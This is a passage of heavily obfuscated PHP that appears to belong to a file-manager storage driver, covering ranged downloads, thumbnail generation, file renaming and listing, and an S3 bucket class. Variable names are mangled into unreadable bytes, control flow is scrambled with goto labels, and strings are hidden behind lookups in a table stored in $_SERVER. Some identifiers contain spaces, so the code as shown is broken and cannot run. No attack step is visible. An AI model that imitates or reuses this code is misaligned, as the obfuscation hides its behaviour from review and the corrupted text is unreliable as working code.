intval($f†¥ÕõÅë¥[1]); if (!empty($f†¥ÕõÅë¥[2])) { $aø¬¹Õ÷ˆ¶ = intval($f†¥ÕõÅë¥[2]); } } header($Dí‚Ö¼¨ÚŠ[159]); header("\103\157\x6e\x74\145\156\164\x2d\x52\141\156\x67\145\72\40\142\x79\x74\x65\x73\40{$a¦½ò–äÌÛ}\55{$aø¬¹Õ÷ˆ¶}\x2f" . $fŞ„™çÊ‹); } else { header($Dí‚Ö¼¨ÚŠ[160]); } goto Dî¹Øìáê¼; AæãâÜ¹„…: if ($a•”İÍî†á) { $eÂ’¦³ö© = intval(1000 * 1000 * ($CóÄ‘ì‰‡ / $a•”İÍî†á)); } while ($a¦½ò–äÌÛ <= $aø¬¹Õ÷ˆ¶) { $aõÃó¡„İç = timeFloat(); check_abort(); $b­³”ˆ ù¦ = $aø¬¹Õ÷ˆ¶ - $a¦½ò–äÌÛ + 1; if ($b­³”ˆ ù¦ <= $CóÄ‘ì‰‡) { $CóÄ‘ì‰‡ = $b­³”ˆ ù¦; } echo $this->fileSubstr($F“ì¢ÙèÃô, $a¦½ò–äÌÛ, $CóÄ‘ì‰‡); $a¦½ò–äÌÛ += $CóÄ‘ì‰‡; if ($CóÄ‘ì‰‡ == $b­³”ˆ ù¦) { $a¦½ò–äÌÛ = $aø¬¹Õ÷ˆ¶ + 1; } if ($eÂ’¦³ö©) { $eÎ‹ß­« = intval(1000 * 1000 * (timeFloat() - $aõÃó¡„İç)); $bªç…°…½¥ = $eÂ’¦³ö© - $eÎ‹ß­«; if ($bªç…°…½¥ > 5) { usleep($bªç…°…½¥); } } } goto E¦¤ÍÑº±; AˆŞ‡£Ü­Ø: header($Dí‚Ö¼¨ÚŠ[131]); header($Dí‚Ö¼¨ÚŠ[132] . $Fëˆ°·Ûù); header($Dí‚Ö¼¨ÚŠ[133] . gmdate($Dí‚Ö¼¨ÚŠ[116], time() + 3600 * 24 * 30) . $Dí‚Ö¼¨ÚŠ[134]); goto DÚáËÏÛ©; e»šºÑ: if (in_array($E£¤Á›™ŠÈ, array($Dí‚Ö¼¨ÚŠ[118], $Dí‚Ö¼¨ÚŠ[119], $Dí‚Ö¼¨ÚŠ[120], $Dí‚Ö¼¨ÚŠ[121]))) { $E£¤Á›™ŠÈ = $Dí‚Ö¼¨ÚŠ[122]; } if (!$F£º¼´…) { $F£º¼´… = md5($bø«Íéç¾æ . $this->hashSimple($F“ì¢ÙèÃô)); } $F£º¼´… = $Dí‚Ö¼¨ÚŠ[123] . $F£º¼´… . $Dí‚Ö¼¨ÚŠ[123]; goto Dª‹º‘Îî; cÛöÖ¿³›: @ob_end_clean(); set_timeout(); $bèÜÑô¼‚ = $this->infoFull($F“ì¢ÙèÃô); goto C› éÄî‘Õ; DÚáËÏÛ©: header($Dí‚Ö¼¨ÚŠ[135]); header($Dí‚Ö¼¨ÚŠ[136]); header($Dí‚Ö¼¨ÚŠ[137]); goto A£¹ÁÅÀø; C› éÄî‘Õ: $fŞ„™çÊ‹ = $bèÜÑô¼‚[$Dí‚Ö¼¨ÚŠ[87]]; $bø«Íéç¾æ = gmdate($Dí‚Ö¼¨ÚŠ[116], $bèÜÑô¼‚[$Dí‚Ö¼¨ÚŠ[117]]); $bµƒ‡…âš = $EÄ†“ª‚‚¥ ? $EÄ†“ª‚‚¥ : $this->iconvApp($bèÜÑô¼‚[$Dí‚Ö¼¨ÚŠ[38]]); goto bæ¸„’ò‘; E¦¤ÍÑº±: } public function fileOutServer($DçÏÁô¯É, $FÁê­Œ‘•Ğ = false, $f“ÍÂ„¢Î… = false, $F±–—È¨°ø = '') { $this->fileOut($DçÏÁô¯É, $FÁê­Œ‘•Ğ, $f“ÍÂ„¢Î…, $F±–—È¨°ø); } public function fileOutLink($Få‹±­»­) { header($_SERVER[±á õÁ][166] . $Få‹±­»­); die; } public function cacheMethod($e—Í¸˜ˆê, $D¿Ü™æ©ôõ, $d¶ËˆìÏÌÔ = null) { goto EÊ»ÀÊÏº; BÆ¡êšª¹: if (!is_null($d¶ËˆìÏÌÔ)) { $fííÉÚ¿Ç[$CõçĞ¶ œ] = $d¶ËˆìÏÌÔ; return; } $Bİ‰İ“İ‰é = isset($fííÉÚ¿Ç[$CõçĞ¶ œ]) ? $fííÉÚ¿Ç[$CõçĞ¶ œ] : null; if (!is_null($Bİ‰İ“İ‰é)) { return $Bİ‰İ“İ‰é; } goto aëğ«ğ†ĞÏ; DÑ†•â¥ÉÏ: $CõçĞ¶ œ = $B½Æ İ“È¯[167] . $e—Í¸˜ˆê . $B½Æ İ“È¯[168] . rtrim($cë½åßâ…’, $B½Æ İ“È¯[8]); if (is_null($e—Í¸˜ˆê)) { $fííÉÚ¿Ç = array(); return; } if (is_null($D¿Ü™æ©ôõ)) { unset($fííÉÚ¿Ç[$CõçĞ¶ œ]); return; } goto BÆ¡êšª¹; EÊ»ÀÊÏº: $B½Æ İ“È¯ =& $_SERVER[±á õÁ]; static $fííÉÚ¿Ç = array(); $cë½åßâ…’ = $D¿Ü™æ©ôõ ? ltrim($this->getPathOuter($D¿Ü™æ©ôõ), $B½Æ İ“È¯[8]) : $D¿Ü™æ©ôõ; goto DÑ†•â¥ÉÏ; aëğ«ğ†ĞÏ: $Bİ‰İ“İ‰é = $this->{$e—Í¸˜ˆê}($D¿Ü™æ©ôõ); $fííÉÚ¿Ç[$CõçĞ¶ œ] = $Bİ‰İ“İ‰é; return $Bİ‰İ“İ‰é; goto fßˆë„Š„ö; fßˆë„Š„ö: } public function fileOutImage($eğ°”ğà„‡, $d¢Ü¯‘ˆùÙ = 250) { goto còÁ§¶ˆÉŞ; F›Ï°°Øåî: if ($bôÖßçµÖ[$E²ÈÁ»òê[87]] <= 1024 * 50 || $E—“œ©¦¼† || !function_exists($E²ÈÁ»òê[174]) || $bôÖßçµÖ[$E²ÈÁ»òê[175]] == $E²ÈÁ»òê[176]) { return $this->fileOut($eğ°”ğà„‡, !1, $CùŸ¹ŸŸÛ°); } if (isset($bôÖßçµÖ[$E²ÈÁ»òê[171]][$E²ÈÁ»òê[177]])) { $bˆ×ƒ½Ú‚ = $bôÖßçµÖ[$E²ÈÁ»òê[171]][$E²ÈÁ»òê[177]]; } else { if (isset($bôÖßçµÖ[$E²ÈÁ»òê[171]][$E²ÈÁ»òê[178]])) { $bˆ×ƒ½Ú‚ = $bôÖßçµÖ[$E²ÈÁ»òê[171]][$E²ÈÁ»òê[178]]; } else { $bˆ×ƒ½Ú‚ = md5("{$bôÖßçµÖ[$E²ÈÁ»òê[38]]}\x5f{$bôÖßçµÖ[$E²ÈÁ»òê[85]]}\x5f{$bôÖßçµÖ[$E²ÈÁ»òê[87]]}"); } } $c÷Äè‹Ÿ¼Ê = "{$bˆ×ƒ½Ú‚}\x5f{$d¢Ü¯‘ˆùÙ}\x2e\x70\x6e\147"; goto C¿¨¥í…é; b½¦¯‡¿: if (!file_exists($D´ÆµÍ«¨) || filesize($D´ÆµÍ«¨) < 100) { return @file_exists($AµÁŒ§œÍ) ? IO::fileOut($AµÁŒ§œÍ) : $this->fileOut($eğ°”ğà„‡); } if (!($f°•Üìª = IO::move($D´ÆµÍ«¨, $f› µ—­Á­))) { return IO::fileOut($D´ÆµÍ«¨); } del_file($D´ÆµÍ«¨); goto F©Šõóˆ»Ç; F©Šõóˆ»Ç: IO::fileOut($f°•Üìª); goto eôíË÷‹ä; E”°Ù£ÌŠ: $D´ÆµÍ«¨ = DATA_THUMB . $c÷Äè‹Ÿ¼Ê; del_file($D´ÆµÍ«¨); if (!@file_exists($D´ÆµÍ«¨)) { $föÀîº²¯À = TEMP_FILES; if (!is_dir($föÀîº²¯À)) { mk_dir($föÀîº²¯À); } $AµÁŒ§œÍ = $föÀîº²¯À . $bˆ×ƒ½Ú‚ . $E²ÈÁ»òê[101] . $bôÖßçµÖ[$E²ÈÁ»òê[175]]; if (!@file_exists($AµÁŒ§œÍ)) { $AµÁŒ§œÍ = $this->download($eğ°”ğà„‡, $AµÁŒ§œÍ); } $E®ÏË×Í• = new ImageThumb($AµÁŒ§œÍ, $E²ÈÁ»òê[181]); $E®ÏË×Í•->prorate($D´ÆµÍ«¨, $d¢Ü¯‘ˆùÙ, $d¢Ü¯‘ˆùÙ * 10); } goto b½¦¯‡¿; còÁ§¶ˆÉŞ: $E²ÈÁ»òê =& $_SERVER[±á õÁ]; if (substr($eğ°”ğà„‡, 0, 4) == $E²ÈÁ»òê[154]) { $this->fileOutLink($eğ°”ğà„‡); } $bôÖßçµÖ = $this->info($eğ°”ğà„‡); goto EßˆÔÄñ‹é; EßˆÔÄñ‹é: $CùŸ¹ŸŸÛ° = $bôÖßçµÖ[$E²ÈÁ»òê[38]]; $E—“œ©¦¼† = !1; if (isset($GLOBALS[$E²ÈÁ»òê[169]]) && $GLOBALS[$E²ÈÁ»òê[169]][$E²ÈÁ»òê[85]] == $bôÖßçµÖ[$E²ÈÁ»òê[85]]) { $E—…õ¿Ø = $GLOBALS[$E²ÈÁ»òê[169]][$E²ÈÁ»òê[170]]; if (!$bôÖßçµÖ[$E²ÈÁ»òê[171]]) { $bôÖßçµÖ[$E²ÈÁ»òê[171]] = $GLOBALS[$E²ÈÁ»òê[169]]; } if (isset($E—…õ¿Ø[$E²ÈÁ»òê[172]])) { if ($E—…õ¿Ø[$E²ÈÁ»òê[172]] <= $d¢Ü¯‘ˆùÙ && $E—…õ¿Ø[$E²ÈÁ»òê[173]] <= $d¢Ü¯‘ˆùÙ) { $E—“œ©¦¼† = !0; } } $CùŸ¹ŸŸÛ° = $bôÖßçµÖ[$E²ÈÁ»òê[171]][$E²ÈÁ»òê[38]]; } goto F›Ï°°Øåî; C¿¨¥í…é: if (!($fÏÇ¼î¾Ö = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $E²ÈÁ»òê[179]))) { $f› µ—­Á­ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $E²ÈÁ»òê[180]); } else { $f› µ—­Á­ = KodIO::make($fÏÇ¼î¾Ö); } if ($fÏÇ¼î¾Ö = IO::fileNameExist($f› µ—­Á­, $c÷Äè‹Ÿ¼Ê)) { $D´ÆµÍ«¨ = KodIO::make($fÏÇ¼î¾Ö); return IO::fileOut($D´ÆµÍ«¨, !1, $CùŸ¹ŸŸÛ°); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto E”°Ù£ÌŠ; eôíË÷‹ä: } public function fileOutImageServer($D”¢Œ÷…“‹, $EÌ¯Õ‘é« = 250) { $this->fileOutImage($D”¢Œ÷…“‹, $EÌ¯Õ‘é«); } public function fileNameAuto($E›¯ù¼¡Ö´, $e¢ğÉÀÃØ‘, $c¾àÀª·ï = REPEAT_RENAME, $fˆ¤Ä§ŠÅ‹ = false) { goto B ÇóóáÖ; f¹²Ë”ˆ†: while ($this->exist(rtrim($E›¯ù¼¡Ö´, $fÃä¼„Ëçõ[8]) . $fÃä¼„Ëçõ[8] . $c²±î¾ÅĞ´)) { $c²±î¾ÅĞ´ = $bõç˜®¢ÁÙ . "\50{$e‰È”Æé«ã}\x29{$dŠ¶«Ğˆ‘}"; $e‰È”Æé«ã++; } return $c²±î¾ÅĞ´; goto cºöÕ ×’; B ÇóóáÖ: $fÃä¼„Ëçõ =& $_SERVER[±á õÁ]; $DÔÙ¾ĞÍö = $E›¯ù¼¡Ö´ === $fÃä¼„Ëçõ[43] ? $e¢ğÉÀÃØ‘ : rtrim($E›¯ù¼¡Ö´, $fÃä¼„Ëçõ[8]) . $fÃä¼„Ëçõ[8] . $e¢ğÉÀÃØ‘; if ($c¾àÀª·ï == REPEAT_REPLACE || !$this->exist($DÔÙ¾ĞÍö) || $fˆ¤Ä§ŠÅ‹ && $c¾àÀª·ï != REPEAT_RENAME_FOLDER) { return $e¢ğÉÀÃØ‘; } goto Eš„ñŸùƒ; D·—ŠÀÅ“: $e‰È”Æé«ã = 1; $bõç˜®¢ÁÙ = substr($e¢ğÉÀÃØ‘, 0, strlen($e¢ğÉÀÃØ‘) - strlen($dŠ¶«Ğˆ‘)); $c²±î¾ÅĞ´ = $bõç˜®¢ÁÙ . "\50{$e‰È”Æé«ã}\51{$dŠ¶«Ğˆ‘}"; goto f¹²Ë”ˆ†; Eš„ñŸùƒ: if ($c¾àÀª·ï == REPEAT_SKIP) { return !1; } $dŠ¶«Ğˆ‘ = $fÃä¼„Ëçõ[101] . get_path_ext($e¢ğÉÀÃØ‘); $dŠ¶«Ğˆ‘ = $dŠ¶«Ğˆ‘ == $fÃä¼„Ëçõ[101] || $fˆ¤Ä§ŠÅ‹ ? $fÃä¼„Ëçõ[43] : $dŠ¶«Ğˆ‘; goto D·—ŠÀÅ“; cºöÕ ×’: } public function listAllFiles($c›´ÔäºŠ, $c™Ã¢†, $FŞÊ·Å³– = array()) { goto eäÏÑÙ¶ëë; a®£½™„íÜ: $c›´ÔäºŠ = trim($c›´ÔäºŠ, $D…ÕÔèŒ­ë[8]); foreach ($c™Ã¢† as $C®öåØï„Î) { $C³¹Œù½Û¥ = ltrim(substr(trim($C®öåØï„Î, $D…ÕÔèŒ­ë[8]), strlen($c›´ÔäºŠ)), $D…ÕÔèŒ­ë[8]); $cøÙñ®Ë·ª = array_merge($cøÙñ®Ë·ª, $this->slicePath($C³¹Œù½Û¥)); } $BõŸ¯ÔÜë« = array(); goto d¹™ÃÕù; d¹™ÃÕù: foreach (array_unique($cøÙñ®Ë·ª) as $C®öåØï„Î) { $bùÎÄšÇ¤ = array($D…ÕÔèŒ­ë[85] => $this->getPathOuter($D…ÕÔèŒ­ë[8] . $c›´ÔäºŠ . $D…ÕÔèŒ­ë[8] . $C®öåØï„Î), $D…ÕÔèŒ­ë[86] => 1, $D…ÕÔèŒ­ë[87] => 0); if (substr($C®öåØï„Î, -1) != $D…ÕÔèŒ­ë[8]) { $bùÎÄšÇ¤[$D…ÕÔèŒ­ë[86]] = 0; $cÛñ°Ê»¯‰ = $this->getPath($c›´ÔäºŠ . $D…ÕÔèŒ­ë[8] . $C®öåØï„Î); $bùÎÄšÇ¤[$D…ÕÔèŒ­ë[87]] = isset($FŞÊ·Å³–[$cÛñ°Ê»¯‰]) ? $FŞÊ·Å³–[$cÛñ°Ê»¯‰] : $this->size($cÛñ°Ê»¯‰); } $BõŸ¯ÔÜë«[] = $bùÎÄšÇ¤; } return $BõŸ¯ÔÜë«; goto Aö®Ôˆ°Ş–; eäÏÑÙ¶ëë: $D…ÕÔèŒ­ë =& $_SERVER[±á õÁ]; if (empty($c™Ã¢†)) { return array(); } $cøÙñ®Ë·ª = array(); goto a®£½™„íÜ; Aö®Ôˆ°Ş–: } public function slicePath($Bææ˜¢ÕÁÅ) { $cº…÷À©¾Œ =& $_SERVER[±á õÁ]; $cÔïª‚Ã = explode($cº…÷À©¾Œ[8], trim($Bææ˜¢ÕÁÅ, $cº…÷À©¾Œ[8])); $CŒæ§ó¡” = 0; do { ++$CŒæ§ó¡”; $c‚õÙ£ˆ‘[] = implode($cº…÷À©¾Œ[8], array_slice($cÔïª‚Ã, 0, $CŒæ§ó¡”)) . $cº…÷À©¾Œ[8]; } while ($CŒæ§ó¡” < count($cÔïª‚Ã)); $c‚õÙ£ˆ‘[count($cÔïª‚Ã) - 1] = $Bææ˜¢ÕÁÅ; return $c‚õÙ£ˆ‘; } public function getHost() { $AïñË´¿è =& $_SERVER[±á õÁ]; $CĞõ ··«¤ = parse_url(trim($this->domain, $AïñË´¿è[8])); $d†ŞĞÎ‘ê¼ = isset($CĞõ ··«¤[$AïñË´¿è[182]]) ? $CĞõ ··«¤[$AïñË´¿è[182]] : http_type(); $eÎËß¨ÙˆÎ = isset($CĞõ ··«¤[$AïñË´¿è[183]]) ? $CĞõ ··«¤[$AïñË´¿è[183]] : $CĞõ ··«¤[$AïñË´¿è[85]]; if (isset($CĞõ ··«¤[$AïñË´¿è[184]])) { $eÎËß¨ÙˆÎ .= $AïñË´¿è[4] . $CĞõ ··«¤[$AïñË´¿è[184]]; } return $d†ŞĞÎ‘ê¼ . $AïñË´¿è[185] . $eÎËß¨ÙˆÎ; } public function pathEncode($DºøŒ‚¿) { $fª´‹¼ĞÄ¹ =& $_SERVER[±á õÁ]; return str_replace($fª´‹¼ĞÄ¹[186], $fª´‹¼ĞÄ¹[8], rawurlencode($DºøŒ‚¿)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($A¡Ê¥‘¡œÕ) { set_timeout(); require_once SDK_DIR . $_SERVER[±á õÁ][187]; parent::__construct(); $this->_init($A¡Ê¥‘¡œÕ); } public function _init($AÖŒ³ùöµ’) { foreach ($AÖŒ³ùöµ’ as $f¦®­…¸‰İ => $BšëİÁÂ¡ô) { if (isset($this->{$f¦®­…¸‰İ})) { $this->{$f¦®­…¸‰İ} = $BšëİÁÂ¡ô; } } $this->endpoint = $AÖŒ³ùöµ’[$_SERVER[±á õÁ][188]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($cÆ§Œ¨Ë¨‹ = "\166\x34") { $this->signVer = $cÆ§Œ¨Ë¨‹; $this->client->setSignatureVersion($cÆ§Œ¨Ë¨‹); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto eùÇˆÁÈÇ; E–İáÅØ«: $E¾£ğô‡Š¡ = array($e…‚³äÓ¹“[194], $e…‚³äÓ¹“[195], $e…‚³äÓ¹“[196], $e…‚³äÓ¹“[197], $e…‚³äÓ¹“[198]); $fëŒèÍÙÉÂ = array_diff($E¾£ğô‡Š¡, $FäŒÈ¹òÌÉ); return empty($fëŒèÍÙÉÂ); goto F±œÂ­°Ÿ¯; d‘Œ¾‰¯Æ‰: if ($E³µœ•¬Ÿº[$e…‚³äÓ¹“[189]] != $e…‚³äÓ¹“[190] || $E³µœ•¬Ÿº[$e…‚³äÓ¹“[191]] != $e…‚³äÓ¹“[190]) { return !1; } $FäŒÈ¹òÌÉ = array_map($e…‚³äÓ¹“[192], $E³µœ•¬Ÿº[$e…‚³äÓ¹“[193]]); if (!is_array($FäŒÈ¹òÌÉ)) { $FäŒÈ¹òÌÉ = array(); } goto E–İáÅØ«; eùÇˆÁÈÇ: $e…‚³äÓ¹“ =& $_SERVER[±á õÁ]; $E³µœ•¬Ÿº = $this->getBucketCors(); if (!$E³µœ•¬Ÿº || !is_array($E³µœ•¬Ÿº)) { return !1; } goto d‘Œ¾‰¯Æ‰; F±œÂ­°Ÿ¯: } public function mkfile($eå—ºåà¯‰, $e„¦Ûª×Şï = '', $B“£øğô¸  = REPEAT_RENAME) { $dêºÃ„¡ÒÁ = $this->setContent($eå—ºåà¯‰, $e„¦Ûª×Şï); if ($dêºÃ„¡ÒÁ !== !1) { return $this->getPathOuter($eå—ºåà¯‰); } return !1; } public function mkdir($eÕ‹âàôÇÛ, $AÕâ¬¢ÔŞ = REPEAT_SKIP) { if (empty($eÕ‹âàôÇÛ)) { return !1; } if ($this->_isFolder($eÕ‹âàôÇÛ)) { return $this->getPathOuter($eÕ‹âàôÇÛ); } $F¸ˆÊè„¸ = $this->setContent($eÕ‹âàôÇÛ, $_SERVER[±á õÁ][43], !0); if ($F¸ˆÊè„¸ !== !1) { return $this->getPathOuter($eÕ‹âàôÇÛ); } return !1; } public function copyFile($aöÎ¨ó Ù™, $fË°ã»‚‹œ, $a»—ÛôÙ¾¡ = array()) { $aëóõ©Í¿¾ =& $_SERVER[±á õÁ]; $BËƒ‰ÁïÕ = $this->objectMeta($aöÎ¨ó Ù™); if (!$BËƒ‰ÁïÕ) { return !1; } if ($BËƒ‰ÁïÕ[$aëóõ©Í¿¾[87]] <= 1024 * 1024 * 200) { $A¡„É¹­›  = $this->client->copyObject($this->bucket, $aöÎ¨ó Ù™, $this->bucket, $fË°ã»‚‹œ, $aëóõ©Í¿¾[199], $a»—ÛôÙ¾¡); } else { $A¡„É¹­›  = $this->client->multiCopyObject($this->bucket, $aöÎ¨ó Ù™, $this->bucket, $fË°ã»‚‹œ, $a»—ÛôÙ¾¡); } $A¡„É¹­›  = $A¡„É¹­›  ? $this->getPathOuter($fË°ã»‚‹œ) : !1; return $A¡„É¹­› ; } public function moveFile($dÁÁ¸Å¿—¢, $EÅ¶ê™ÁÒ°) { if ($this->copyFile($dÁÁ¸Å¿—¢, $EÅ¶ê™ÁÒ°)) { $this->delFile($dÁÁ¸Å¿—¢); return $this->getPathOuter($EÅ¶ê™ÁÒ°); } return !1; } public function delFile($fğóŒ­Ôá) { return $this->client->deleteObject($this->bucket, $fğóŒ­Ôá); } public function delFolder($dí‰Àœ¯¸) { goto A½ÜŠ¿Ù´¬; dâØÆº£: return $this->delByBatch($b‘‹Ø¼±[$E¥œà³¾ì‡[84]]); goto EÔñôÏ³ùÁ; A½ÜŠ¿Ù´¬: $E¥œà³¾ì‡ =& $_SERVER[±á õÁ]; if (!$this->exist($dí‰Àœ¯¸)) { return !0; } $this->listItemCache = !1; goto c–¥Ï´ô…‹; c–¥Ï´ô…‹: $b‘‹Ø¼± = $this->fileList($dí‰Àœ¯¸); $this->listItemCache = !0; $bèÅ÷ÙĞ  = trim($dí‰Àœ¯¸, $E¥œà³¾ì‡[8]) . $E¥œà³¾ì‡[8]; goto BÃÁ§ÄŒŒ²; BÃÁ§ÄŒŒ²: if (!empty($dí‰Àœ¯¸) && !in_array($bèÅ÷ÙĞ , $b‘‹Ø¼±[$E¥œà³¾ì‡[84]])) { $b‘‹Ø¼±[$E¥œà³¾ì‡[84]][] = $bèÅ÷ÙĞ ; } $F…ÓåÇâÅ = $this->delByBatch($b‘‹Ø¼±[$E¥œà³¾ì‡[83]]); if (!$F…ÓåÇâÅ) { return !1; } goto dâØÆº£; EÔñôÏ³ùÁ: } private function delByBatch($C„±œŸ–‚Û) { foreach (array_chunk($C„±œŸ–‚Û, 1000) as $e¤Ë„äÈÎ¶) { $dÑ¤ÎË÷È = $this->client->deleteObjects($this->bucket, $e¤Ë„äÈÎ¶); if (!$dÑ¤ÎË÷È) { return !1; } } return !0; } public function rename($EèÉãÍ»”ì, $D× “ÀÆô‹) { return $this->renameObject($EèÉãÍ»”ì, $D× “ÀÆô‹); } public function listPath($Fö‰Ì©ã, $a¡¸Ù‰ô‹ß = false) { $FøÍï±» =& $_SERVER[±á õÁ]; $e¥ïñÄê«Ä = $this->fileList($Fö‰Ì©ã, $FøÍï±»[8], !0); foreach ($e¥ïñÄê«Ä[$FøÍï±»[84]] as $CŒ¼Íâ‚ => $eÄ÷ŸÌ¦çÇ) { $e¥ïñÄê«Ä[$FøÍï±»[84]][$CŒ¼Íâ‚] = $this->folderInfo($eÄ÷ŸÌ¦çÇ, $a¡¸Ù‰ô‹ß); } foreach ($e¥ïñÄê«Ä[$FøÍï±»[83]] as $CŒ¼Íâ‚ => $eÄ÷ŸÌ¦çÇ) { $e¥ïñÄê«Ä[$FøÍï±»[83]][$CŒ¼Íâ‚] = $this->fileInfo($eÄ÷ŸÌ¦çÇ[$FøÍï±»[38]], $a¡¸Ù‰ô‹ß, $eÄ÷ŸÌ¦çÇ); } return $e¥ïñÄê«Ä; } private function fileInfo($c®£œêœİß, $FÉ–œ­Áâ = false, $A˜¢¾ñ¼‚ = array()) { goto fõŒ¶¡¢’; eçí¼ÅÁß: $E¢ã¥±ù‹Š[$eõ×À¼²»«[200]] = $E¢ã¥±ù‹Š[$eõ×À¼²»«[117]] = 0; $E¢ã¥±ù‹Š[$eõ×À¼²»«[201]] = $E¢ã¥±ù‹Š[$eõ×À¼²»«[202]] = !0; if (empty($A˜¢¾ñ¼‚)) { $A˜¢¾ñ¼‚ = $this->objectMeta($c®£œêœİß); if (!$A˜¢¾ñ¼‚) { return $E¢ã¥±ù‹Š; } } goto fò¿Š¹³º“; fò¿Š¹³º“: if (isset($A˜¢¾ñ¼‚[$eõ×À¼²»«[203]])) { $E¢ã¥±ù‹Š[$eõ×À¼²»«[117]] = $A˜¢¾ñ¼‚[$eõ×À¼²»«[203]]; } if (isset($A˜¢¾ñ¼‚[$eõ×À¼²»«[87]])) { $E¢ã¥±ù‹Š[$eõ×À¼²»«[87]] = $A˜¢¾ñ¼‚[$eõ×À¼²»«[87]]; } return $E¢ã¥±ù‹Š; goto dÑÄš¼Ê„˜; fõŒ¶¡¢’: $eõ×À¼²»« =& $_SERVER[±á õÁ]; $E¢ã¥±ù‹Š = array($eõ×À¼²»«[38] => $this->pathThis($c®£œêœİß), $eõ×À¼²»«[85] => $this->getPathOuter($c®£œêœİß), $eõ×À¼²»«[39] => $eõ×À¼²»«[181], $eõ×À¼²»«[175] => $this->ext($c®£œêœİß), $eõ×À¼²»«[87] => isset($A˜¢¾ñ¼‚[$eõ×À¼²»«[87]]) ? $A˜¢¾ñ¼‚[$eõ×À¼²»«[87]] : 0); if ($FÉ–œ­Áâ) { return $E¢ã¥±ù‹Š; } goto eçí¼ÅÁß; dÑÄš¼Ê„˜: } private function folderInfo($Bæ‰‹Á¿È, $E–Í†Á‰·Ö = false) { goto a¸æ´™²ä; bĞš¡‹¥¼©: $Bæ‰‹Á¿È = trim($Bæ‰‹Á¿È, $cˆ–ë´º²[8]) . $cˆ–ë´º²[8]; $Aöª³÷ì¼À = $this->objectMeta($Bæ‰‹Á¿È); if (isset($Aöª³÷ì¼À[$cˆ–ë´º²[203]])) { $E‰é¡òºç[$cˆ–ë´º²[200]] = $Aöª³÷ì¼À[$cˆ–ë´º²[203]]; } goto dø—³£„¼³; dø—³£„¼³: return $E‰é¡òºç; goto d†›½İ±Şî; a¸æ´™²ä: $cˆ–ë´º² =& $_SERVER[±á õÁ]; $E‰é¡òºç = array($cˆ–ë´º²[38] => $this->pathThis($Bæ‰‹Á¿È), $cˆ–ë´º²[85] => $this->getPathOuter($cˆ–ë´º²[8] . $Bæ‰‹Á¿È), $cˆ–ë´º²[39] => $cˆ–ë´º²[86]); if ($E–Í†Á‰·Ö) { return $E‰é¡òºç; } goto dñŒ£±®Ø; dñŒ£±®Ø: $E‰é¡òºç[$cˆ–ë´º²[200]] = $E‰é¡òºç[$cˆ–ë´º²[117]] = 0; $E‰é¡òºç[$cˆ–ë´º²[201]] = $E‰é¡òºç[$cˆ–ë´º²[202]] = !0; if ($Bæ‰‹Á¿È == $cˆ–ë´º²[43]) { return $E‰é¡òºç; } goto bĞš¡‹¥¼©; d†›½İ±Şî: } private function fileList($Dø×¸÷‹Ïù, $f½À–Œ¢Á = '', $C»‚°Í°œŞ = 0) { goto f‚œ¯ƒ…Ê; a”¾¬±ò®®: if (!$E¸ˆŒÑØÏ) { return array($AïÕ£„¼¹î[84] => array(), $AïÕ£„¼¹î[83] => array()); } $Cë®²¶ÌÙè = $this->listItemCache === !1 ? !1 : !0; $cò Áµå‹í = $fô‡ÅšÏÔ = array(); goto D‰½š»ÒÏ; D‰½š»ÒÏ: foreach ($E¸ˆŒÑØÏ[$AïÕ£„¼¹î[204]] as $BÉ‹šï • ) { goto F¼ˆ¾Øç; F¼ˆ¾Øç: $FÒ Ş“¸ˆ = $BÉ‹šï • [$AïÕ£„¼¹î[38]]; if ($FÒ Ş“¸ˆ == $d—³ĞœâÌ) { continue; } $f•ÛİŠ±œÜ = isset($BÉ‹šï • [$AïÕ£„¼¹î[87]]) ? $BÉ‹šï • [$AïÕ£„¼¹î[87]] : 0; goto fœ×¦½¥°˜; E·ö„õ¢óœ: $fô‡ÅšÏÔ[] = $C»‚°Í°œŞ ? $BÉ‹šï •  : $FÒ Ş“¸ˆ; goto AÛ¾â‰î‘Ş; fœ×¦½¥°˜: $CÇÑœ–âà‡ = $f•ÛİŠ±œÜ == 0 && substr($FÒ Ş“¸ˆ, strlen($FÒ Ş“¸ˆ) - 1, 1) == $AïÕ£„¼¹î[8] ? !0 : !1; if ($Cë®²¶ÌÙè) { $this->cacheMethod($AïÕ£„¼¹î[205], $FÒ Ş“¸ˆ, $CÇÑœ–âà‡); $this->cacheMethod($AïÕ£„¼¹î[206], $FÒ Ş“¸ˆ, $BÉ‹šï • ); } if ($CÇÑœ–âà‡) { $cò Áµå‹í[] = $FÒ Ş“¸ˆ; continue; } goto E·ö„õ¢óœ; AÛ¾â‰î‘Ş: } foreach ($E¸ˆŒÑØÏ[$AïÕ£„¼¹î[207]] as $BÉ‹šï • ) { $cò Áµå‹í[] = $BÉ‹šï • [$AïÕ£„¼¹î[38]]; if ($Cë®²¶ÌÙè) { $this->cacheMethod($AïÕ£„¼¹î[205], $BÉ‹šï • [$AïÕ£„¼¹î[38]], !0); } } if ($Cë®²¶ÌÙè) { $this->cacheMethod($AïÕ£„¼¹î[205], $Dø×¸÷‹Ïù, !0); } goto fìêÔ¤ùè; fìêÔ¤ùè: return array($AïÕ£„¼¹î[84] => $cò Áµå‹í, $AïÕ£„¼¹î[83] => $fô‡ÅšÏÔ); goto EÔĞ®„ƒôÔ; f‚œ¯ƒ…Ê: $AïÕ£„¼¹î =& $_SERVER[±á õÁ]; $d—³ĞœâÌ = rtrim($Dø×¸÷‹Ïù, $AïÕ£„¼¹î[8]) . $AïÕ£„¼¹î[8]; $E¸ˆŒÑØÏ = $this->listObjs($d—³ĞœâÌ, null, null, $f½À–Œ¢Á); goto a”¾¬±ò®®; EÔĞ®„ƒôÔ: } private function listObjs($CéÀìÂ—ï, $Aãğ±ÄÕ°¨ = null, $Fß…¾Õñ = null, $cß¥šá¤› = null) { $cåª“Î®Î³ =& $_SERVER[±á õÁ]; 